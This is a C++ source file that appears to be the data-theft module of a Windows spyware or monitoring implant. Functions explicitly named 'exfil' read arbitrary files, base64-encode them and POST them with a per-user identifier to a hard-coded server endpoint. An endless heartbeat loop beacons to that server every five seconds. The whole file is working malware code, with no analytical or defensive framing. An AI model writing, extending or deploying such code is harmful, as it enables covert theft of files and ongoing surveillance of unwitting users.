#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <thread>
#include <chrono>
#include <string>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>
#include <curl/curl.h>
#include "winmon.h"
#include <algorithm>

using namespace std;

const std::string url = "http://localhost:3000/endpoint";
#define HEARTBEAT_INTERVAL 5 // Seconds


std::string getCurrentTimeString() {
  time_t currentTime = time(nullptr);
  struct tm* currentTm = localtime(&currentTime);
  char timeString[30];
  strftime(timeString, 30, "D@%m_%d_%Y___T@%H_%M_%S", currentTm);
  return timeString;
}


string create_json_string(string data_type, string data) {
    const std::string payload = "{\"user_id\":\"" + g_unique_identifier + "\", \"time\":\"" + getCurrentTimeString() + "\", \"type\":\"" + data_type + "\", \"data\":\"" + data + "\"}";
    return payload;
}


size_t WriteCallback(char *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}


string exfil_to_server(string payload) {
    curl_global_init(CURL_GLOBAL_ALL);
    CURL* easyhandle = curl_easy_init();
    std::string readBuffer;
    curl_easy_setopt(easyhandle, CURLOPT_URL, url.c_str());
    curl_easy_setopt(easyhandle, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(easyhandle, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, &readBuffer);
    curl_easy_perform(easyhandle);
    return readBuffer;
}


std::string file_to_base64(const std::string& filename) {
    // Converting file contents to base64
    std::ifstream file(filename);
    std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_write(b64, fileContents.c_str(), fileContents.size());
    BIO_flush(b64);
    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);
    std::string base64Encoded(bptr->data, bptr->length);
    BIO_free_all(b64);

    // Removing all new lines from string
    std::string result;
    result.reserve(base64Encoded.size());
    std::copy_if(base64Encoded.begin(), base64Encoded.end(), std::back_inserter(result), [](char c) { return c != '\n'; });
    return result;
}


int exfil_file_log(string data_type, string filename) {
    string result = file_to_base64(filename);
    string payload = create_json_string(data_type, result);
    cout << payload << endl;
    string response = exfil_to_server(payload);            
    cout << "exfil_file_log Response: " << response <<endl;    
    return 1;
}


void ascii_heartbeat() {
    string ah = "";
    ah =    "        /\\\n";
    ah+=    "       /  \\\n";        
    ah+=    "      /    \\      /\\\n";
    ah+=    "-----/ - - -\\ - -/  \\ -/ -----\n";
    ah+=    "             \\  /    \\/\n";
    ah+=    "              \\/\n";
    cout << ah << endl;
}


int heartbeat() {
    while (true) {
        ascii_heartbeat();
        std::string payload = create_json_string("heartbeat", "None!");
        std::string response = exfil_to_server(payload);            
        cout << "Response: " << response <<endl;
        std::this_thread::sleep_for(std::chrono::seconds(HEARTBEAT_INTERVAL));
    }

    return 0;
}





